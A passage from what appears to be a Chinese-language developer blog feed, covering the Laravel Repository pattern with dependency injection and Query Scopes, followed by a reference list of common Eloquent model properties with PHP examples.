*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserRepository</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> User</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> $user;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * UserRepository constructor.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $user</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(User $user)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;user = $user;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $age</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> \Illuminate\Database\Eloquent\Collection|static[]</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAgeLargerThan</span><span class="params">($age)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;user</span><br><span class="line">            -&gt;where(<span class="string">'age'</span>, <span class="string">'&gt;'</span>, $age)</span><br><span class="line">            -&gt;orderBy(<span class="string">'age'</span>)</span><br><span class="line">            -&gt;get();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在控制器<code>app\Controllers\UserController.php</code> 中使用依赖注入：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Repositories</span>\<span class="title">UserRepository</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Http</span>\<span class="title">Request</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Class UserController</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@package</span> App\Http\Controllers</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> \App\Repositories\UserRepository</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> $userRepository;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * UserController constructor.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $userRepository</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(UserRepository $userRepository)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;userRepository = $userRepository;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> \Illuminate\Database\Eloquent\Collection|static[]</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;userRepository-&gt;getAgeLargerThan(<span class="number">20</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将相依的 <code>UserRepository</code> 依賴注入到 <code>UserController</code>，并从原本直接依赖 <code>User Model</code> 改成依赖注入的 <code>UserRepository</code>。</p><p>优点：</p><ul><li>将数据库逻辑写在 Repository 里，解决了 Controller 代码臃肿的问题。</li><li>符合 SOLID 的单一职责原则：数据库逻辑写在 Repository 里，没写在 Controller 里。</li><li>符合 SOLID 的依赖反转原则：Controller 并非直接相依与 Repositroy，而是将 Repository 依赖注入进 Controller。</li></ul><blockquote><p>注意⚠️：实际上建议 Repository 仅依赖注入进 Service，而不是直接注入在 Controller。</p></blockquote><h2 id="其他问题"><a href="#其他问题" class="headerlink" title="其他问题"></a>其他问题</h2><h3 id="是否该建立-Repository-Interface？"><a href="#是否该建立-Repository-Interface？" class="headerlink" title="是否该建立 Repository Interface？"></a>是否该建立 Repository Interface？</h3><p>理论上使用依赖注入时，应该使用 Interface ，不过 Interface 目的在于更换数据库，让代码达到开放封闭的要求，但是实际上要更改 Reposiroty 的机会也不多，除非是从 MySQL 更换到 MongoDB，此时就应该建立 Repository Interface。<br>不过由于我们使用了依赖注入，将来要从 Class 改成 Interface 也很方便，只要在 Constructor 的 type hint 改成 Interface 即可，维护成本很低，所以在此大可使用 Repository Class 即可，不一定得用Interface而造成 Over Design，等真正需要修改时，再重构 Interface 即可。</p><h3 id="是否该使用-Query-Scope"><a href="#是否该使用-Query-Scope" class="headerlink" title="是否该使用 Query Scope?"></a>是否该使用 Query Scope?</h3><p>Laravel 4.2 就有 QueryScope，到后面的版本也都还保留着，它让我们可以将逻辑代码写在 Model ，解决了维护与重复使用的问题。<br>如 app/User.php 里的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Notifications</span>\<span class="title">Notifiable</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Auth</span>\<span class="title">User</span> <span class="title">as</span> <span class="title">Authenticatable</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * App\User</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@mixin</span> \Eloquent</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">extends</span> <span class="title">Authenticatable</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Notifiable</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * The attributes that are mass assignable.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> $fillable = [</span><br><span class="line">        <span class="string">'name'</span>, <span class="string">'email'</span>, <span class="string">'password'</span>,</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * The attributes that should be hidden for arrays.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> $hidden = [</span><br><span class="line">        <span class="string">'password'</span>, <span class="string">'remember_token'</span>,</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Builder $query</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> integer $age</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> Builder</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">scopeGetAgerLargerThan</span><span class="params">($query, $age)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $query-&gt;where(<span class="string">'age'</span>, <span class="string">'&gt;'</span>, $age)</span><br><span class="line">            -&gt;orderBy(<span class="string">'age'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>QueryScope 必须以 scope开头，第一个参数为 queryBuilder，一定要加上；第二个参数以后为自己要传入的参数。<br>由于回传必须是一个 queryBuilder ，因此不需要加上 <code>get()</code>，在<br><code>app/Controllers/UserController.php</code> 中使用代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Repositories</span>\<span class="title">UserRepository</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">User</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Http</span>\<span class="title">Request</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Class UserController</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@package</span> App\Http\Controllers</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> \App\Repositories\UserRepository</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> $userRepository;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * UserController constructor.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $userRepository</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(UserRepository $userRepository)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;userRepository = $userRepository;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> \Illuminate\Database\Eloquent\Collection|static[]</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> User::getAgerLargerThan(<span class="number">20</span>)-&gt;get();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 Controller 中使用 QueryScope 时，不需要加上 Prefix，由于其本质是 queryBuilder，所以还要加上 get() 才能获得 Conllection 数据。</p><p>由于 QueryScope 是写在 Model，不是写在 Controller，所以基本上解决了 Controller 臃肿违反 SOLID 的单一职责原则的问题， Controller 也可以重复使用 QueryScope ，已经比直接将资料库逻辑写在 Controlelr 中好很多。<br>不过若在中大型项目中，仍然有以下问题：</p><ul><li>Model 已经有原来的责任，若再加上 queryScope，造成 Model 过于臃肿难以维护。</li><li>若数据库逻辑很多，可能拆成多个 Repository，可是确很难拆成多个 Model。</li><li>单元测试困难，必须面临 mock Eloquent 的问题。</li></ul><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>实际开发时，可以一开始 1 个 Repository 对应 1 个 Model，但是也不必太过执着于 1 个 Repository，一定要对应 1 个 Model，可将 Repository 视为逻辑上的数据库逻辑类别即可，可以横跨多个Model处理，也可以 1 个 Model 拆成多个 Repository，视情况而定。<br>Repository 使得数据库逻辑从 Controller 或 Model 中解放，不仅更容易维护、更容易拓展、更容易重复使用，也更容易测试。</p><hr><h2 id="是否需要使用-Repository-？"><a href="#是否需要使用-Repository-？" class="headerlink" title="是否需要使用 Repository ？"></a>是否需要使用 Repository ？</h2><p>倒底该不该用Repository，对于这个问题，从未停止过讨论。我认为没有绝对的用或者不用，需要根据项目实际情况而定。</p><p>结合自己的一些项目经验，我的理解是：对于小项目而言，复杂查询并不多，直接使用ORM效率更高，前期快速开发才是关键，过早使用Repository 反而会造成过度设计; 而对于起步本身就是中大型项目，则可以考虑使用Repository 将复杂的查询和业务逻辑分开。</p><p>单一职责原则：</p><ul><li>Request 负责表单验证</li><li>Model 负责维护ORM</li><li>Controller 负责获取请求参数</li><li>Service 负责处理业务逻辑</li><li>Repository 负责从数据库里取数据</li></ul><p>这里有两个讨论很精彩：<a href="https://learnku.com/laravel/t/16338" target="_blank" rel="noopener">绝不 使用 Repository??</a>、<a href="https://learnku.com/laravel/t/10323/never-use-repository" target="_blank" rel="noopener">绝不 使用 Repository?</a></p>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
          <category> Laravel </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Laravel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Laravel Eloquent 常用属性整理</title>
      <link href="/laravel-eloquent-common-attributes-sorting/"/>
      <url>/laravel-eloquent-common-attributes-sorting/</url>
      
        <content type="html"><![CDATA[<p>Eloquent 提供了很多属性，通过对模型进行约定，可以实现很多很方便的功能。</p><a id="more"></a><h3 id="connection"><a href="#connection" class="headerlink" title="connection"></a>connection</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 为模型指定一个连接名称</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@var</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> $connection = <span class="string">'connection-name'</span>;</span><br></pre></td></tr></table></figure><h3 id="table"><a href="#table" class="headerlink" title="table"></a>table</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 为模型指定一个表名</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@var</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> <span class="keyword">protected</span> $table = <span class="string">'users'</span>;</span><br></pre></td></tr></table></figure><h3 id="primaryKey"><a href="#primaryKey" class="headerlink" title="primaryKey"></a>primaryKey</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 为模型指定主键</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@var</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> <span class="keyword">protected</span> $primaryKey = <span class="string">'user_id'</span>;</span><br></pre></td></tr></table></figure><p>通常主键不是<code>id</code>时，可以使用该属性指定属性。</p><h3 id="incrementing"><a href="#incrementing" class="headerlink" title="incrementing"></a>incrementing</h3><p>Eloquent 假设主键是一个自增的整数值，这意味着默认情况下主键会自动转换为 int 类型。</p><p>如果希望使用非递增或非数字的主键则需要设置公共的 <code>$incrementing</code> 属性设置为 false：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 如果使用的是非递增或者非数字的主键</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@var</span> bool</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> $incrementing = <span class="keyword">false</span>;</span><br></pre></td></tr></table></figure><h3 id="keyType"><a href="#keyType" class="headerlink" title="keyType"></a>keyType</h3><p>如果你的主键不是一个整数，你需要将模型上受保护的 <code>$keyType</code> 属性设置为 string：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 自定义主键类型</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@var</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> $keyType = <span class="string">'string'</span>;</span><br></pre></td></tr></table></figure><h3 id="timestamps"><a href="#timestamps" class="headerlink" title="timestamps"></a>timestamps</h3><p>默认情况下，Eloquent 预期你的数据表中存在<code>created_at</code> 和<code>updated_at</code> 字段，如果不想让 Eloquent 自动管理这两个列， 请将模型中的 $timestamps 属性设置为 false：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 是否主动维护时间戳</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@var</span> bool</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> $timestamps = <span class="keyword">false</span>;</span><br></pre></td></tr></table></figure><h3 id="CREATED-AT-UPDATED-AT"><a href="#CREATED-AT-UPDATED-AT" class="headerlink" title="CREATED_AT|UPDATED_AT"></a>CREATED_AT|UPDATED_AT</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 自定义存储时间戳的字段名</span></span><br><span class="line"><span class="keyword">const</span> CREATED_AT = <span class="string">'start_time'</span>;</span><br><span class="line"><span class="keyword">const</span> UPDATED_AT = <span class="string">'end_time'</span>;</span><br></pre></td></tr></table></figure><h3 id="dateFormat"><a href="#dateFormat" class="headerlink" title="dateFormat"></a>dateFormat</h3><p>如果需要自定义时间戳的格式，在你的模型中设置 $dateFormat 属性。这个属性决定日期属性在数据库的存储方式，以及模型序列化为数组或者 JSON 的格式：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 模型日期的存储格式</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@var</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> $dateFormat = <span class="string">'U'</span>;</span><br></pre></td></tr></table></figure><p>不清楚 U 是什么意思的，请看 <a href="http://php.net/manual/zh/function.date.php" target="_blank" rel="noopener">Date/Time 函数</a> 。</p><h3 id="attributes"><a href="#attributes" class="headerlink" title="attributes"></a>attributes</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 为模型属性设置默认值</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@var</span> array</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> $attributes = [</span><br><span class="line">    <span class="string">'delayed'</span> =&gt; <span class="keyword">false</span>,</span><br><span class="line">];</span><br></pre></td></tr></table></figure><h3 id="hidden"><a href="#hidden" class="headerlink" title="hidden"></a>hidden</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 隐藏以下字段</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@var</span> array</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> $hidden = [<span class="string">'password'</span>];</span><br></pre></td></tr></table></figure><h3 id="visible"><a href="#visible" class="headerlink" title="visible"></a>visible</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 显示以下字段</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@var</span> array</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> $visible = [<span class="string">'first_name'</span>, <span class="string">'last_name'</span>];</span><br></pre></td></tr></table></figure><p>如果说<code>$hidden</code> 属性是黑名单，那么<code>$visible</code> 就是白名单。</p><h3 id="appends"><a href="#appends" class="headerlink" title="appends"></a>appends</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@var</span> string[]</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> $appends = [</span><br><span class="line">    <span class="string">"type_mean"</span></span><br><span class="line">];</span><br></pre></td></tr></table></figure><p><code>appends</code> 属性，通常会配合<a href="https://learnku.com/docs/laravel/8.x/eloquent-mutators/9409#738535" target="_blank" rel="noopener">Accessors</a> 一起使用。</p><h3 id="fillable"><a href="#fillable" class="headerlink" title="fillable"></a>fillable</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 可以被批量赋值的属性</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@var</span> string[]</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> $fillable = [<span class="string">"username"</span>];</span><br></pre></td></tr></table></figure><h3 id="guarded"><a href="#guarded" class="headerlink" title="guarded"></a>guarded</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 设定不可被批量赋值的属性，当 $guarded 为空数组时则所有属性都可以被批量赋值。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@var</span> array</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> $guarded = [<span class="string">'price'</span>];</span><br></pre></td></tr></table></figure><h3 id="casts"><a href="#casts" class="headerlink" title="casts"></a>casts</h3><p><code>casts</code> 属性很有用，可以使得从数据库中获取的数据，可以自动转换成我们期望的类型。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 字段转换为对应的类型</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@var</span> array</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> $casts = [</span><br><span class="line">   <span class="string">"settings"</span> =&gt; <span class="string">"array"</span>,</span><br><span class="line">   <span class="string">'created_at'</span> =&gt; <span class="string">'datetime:Y-m-d H:i:s'</span>,</span><br><span class="line">   <span class="string">'updated_at'</span> =&gt; <span class="string">'datetime:Y-m-d H:i:s'</span>,</span><br><span class="line">   <span class="string">'is_admin'</span> =&gt; <span class="string">'boolean'</span>,</span><br><span class="line">];</span><br></pre></td></tr></table></figure><p>可能的属性转换列类型：<br>|类型|描述|<br>|-|-|<br>|int<code>|</code>integer|通过 PHP 转换（int）|<br>|real<code>|</code>float<code>|</code>double|通过 PHP 转换（float）|<br>|string|通过 PHP 转换（string）|<br>|bool<code>|</code>boolean|通过 PHP 转换（bool）|<br>|object|作为一个stdClass 对象，从JSON 解析或被解析为JSON|<br>|array|作为一个数组，从JSON 解析或被解析为JSON|<br>|collection|作为一个集合，从JSON 解析或被解析为JSON|<br>|date<code>|</code>datetime|从数据库DATATIME 解析为Carbon 类型，然后返回|<br>|timestamp|数数据库TIMESTAMP 解析为Carbon 类型，然后返回|</p><h3 id="dates"><a href="#dates" class="headerlink" title="dates"></a>dates</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 需要被Carbon维护的字段名</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@var</span> array</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> $dates = [<span 